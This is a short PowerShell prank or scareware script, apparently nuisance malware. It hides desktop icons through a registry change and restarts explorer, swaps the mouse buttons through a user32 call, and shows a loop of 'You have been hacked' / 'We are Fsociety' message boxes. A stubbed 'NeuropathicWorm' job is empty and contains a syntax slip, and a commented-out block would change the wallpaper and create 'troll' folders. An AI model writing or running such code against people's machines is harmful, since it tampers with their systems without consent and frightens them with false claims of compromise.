#Methods for change the PC configurations

<# begining method 4 hide icons in the pc#>
$Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
Set-ItemProperty -Path $Path -Name "HideIcons" -Value 1
Get-Process "explorer"| Stop-Process
<# end method 4 hide icons in the pc#>

<# begining method 4 swap the left click#>
[Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") | Out-Null

$SwapButtons = Add-Type -MemberDefinition @'
[DllImport("user32.dll")]
public static extern bool SwapMouseButton(bool swap);
'@ -Name "NativeMethods" -Namespace "PInvoke" -PassThru

$SwapButtons::SwapMouseButton(!([System.Windows.Forms.SystemInformation]::MouseButtonsSwapped))
<# end method 4 swap the left click#>
<#begining 4 sending messages#>
$messages = @('You have been hacked', 'You cannot do anything', 'We are Fsociety', 'Now you are going to know how is have neuropathic')
for ( $index = 0; $index -lt $messages.count; $index++)
    {
        [System.Windows.Forms.MessageBox]::Show($messages[$index], 'Hacked!!')
    }
<#end 4 sending messages#>

#Process in services for execute some annoying methods
-Start-Job -Name NeuropathicWorm -ScriptBlock { 

}
<# 
Function Set-WallPaper()
{
    
}

 Set-WallPaper -value "fsociety.jpg"
Function Set-Desktop(){
    $desktop = $env:USERPROFILE + "\desktop"
    Set-Location $desktop
}

Set-Desktop

for($i=0; $i -lt 5; $i++){
mkdir troll+"$i"
}
 #>

exit